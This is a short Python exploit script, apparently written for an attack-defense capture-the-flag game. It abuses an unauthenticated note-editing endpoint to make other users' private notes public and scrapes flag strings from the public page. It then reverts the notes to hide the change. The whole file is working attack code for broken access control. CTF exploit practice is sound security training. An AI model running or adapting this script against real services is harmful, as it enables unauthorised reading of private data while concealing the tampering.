from utils import attack_data
import sys
import re
import requests


def sploit(host: str, note_id: int):
    requests.post(
        f"http://{host}:5000/edit/{note_id}",
        json={
            "content": "test",
            "is_public": 1
        }
    )
    r = requests.get(
        f"http://{host}:5000/public"
    )
    flags = '\n'.join(re.findall("[0-9-A-Z]{31}=", r.text))
    
    requests.post(
        f"http://{host}:5000/edit/{note_id}",
        json={
            "content": "test"
        }
    )
    
    print(flags, flush=True)


if __name__ == "__main__":
    host = sys.argv[1]
    for ad in attack_data(host):
        _, _, note_id = ad.split(":")
        sploit(host, int(note_id))